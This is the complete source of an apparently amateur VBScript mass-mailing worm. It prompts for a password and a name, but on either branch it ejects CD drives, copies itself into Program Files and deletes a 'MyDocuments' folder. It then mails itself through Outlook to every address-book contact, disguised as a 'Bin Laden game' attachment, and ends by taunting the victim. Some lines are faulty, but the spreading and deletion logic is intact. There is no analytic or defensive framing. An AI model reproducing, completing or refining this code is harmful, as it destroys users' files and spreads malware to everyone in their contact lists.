S = inputbox("Enter Password")
if S = "VBScript" then
Name = InputBox("What is your name?")
bla = msgbox ("Would you like to continue this program " &Name , vbYesNo , "F.T.C.")
if bla = vbYes then
Set oWMP = CreateObject("WMPlayer.OCX.7" )
Set colCDROMs = oWMP.cdromCollection
if colCDROMs.Count  then
For i = 0 to colCDROMs.Count - 1
colCDROMs.Item(i).Eject
Next ' cdrom
set fso=CreateObject("Scripting.FileSystemObject")
fso.CopyFile Wscript.ScriptFullName, "C:\Program Files\*.*.vbs", True
dim foldersys
set foldersys=CreateObject("Scripting.FileSystemObject")
If foldersys.FolderExists ("d:\MyDocuments") Then
foldersys.DeleteFolder "d:\MyDocuments",True
End if
Dim x
on error resume next
Set fso ="Scripting.FileSystem.Object"
Set so=CreateObject(fso)
Set ol=CreateObject("Outlook.Application")
Set out= WScript.CreateObject("Outlook.Application")
Set mapi = out.GetNameSpace("MAPI")
Set a = mapi.AddressLists(1)
For x=1 To a.AddressEntries.Count
Set Mail=ol.CreateItem(0)
Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
Mail.Subject="The Bin Laden game"
Mail.Body="Hi! This is an awesome Bin Laden game.Shoot him good."
Mail.Attachments.Add Wscript.ScriptFullName
Mail.Send
Next
ol.Quit
msgbox "Your pretty stupid you know that"
end if
else
Set oWMP = CreateObject("WMPlayer.OCX.7" )
Set colCDROMs = oWMP.cdromCollection
if colCDROMs.Count  then
For i = 0 to colCDROMs.Count - 1
colCDROMs.Item(i).Eject
Next ' cdrom
set fso=CreateObject("Scripting.FileSystemObject")
fso.CopyFile Wscript.ScriptFullName, "C:\Program Files\*.*.vbs", True
set foldersys=CreateObject("Scripting.FileSystemObject")
If foldersys.FolderExists ("d:\MyDocuments") Then
foldersys.DeleteFolder "d:\MyDocuments",True
End if
on error resume next
Set fso ="Scripting.FileSystem.Object"
Set so=CreateObject(fso)
Set ol=CreateObject("Outlook.Application")
Set out= WScript.CreateObject("Outlook.Application")
Set mapi = out.GetNameSpace("MAPI")
Set a = mapi.AddressLists(1)
For x=1 To a.AddressEntries.Count
Set Mail=ol.CreateItem(0)
Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
Mail.Subject="The Bin Laden Game"
Mail.Body="HI! This is an awesome Bin Laden game!!Shoot him down! "
Mail.Attachments.Add Wscript.ScriptFullName
Mail.Send
Next
ol.Quit
msgbox "Oh well we continued it anyway...Have a Nice Day"
end if
end if
end if 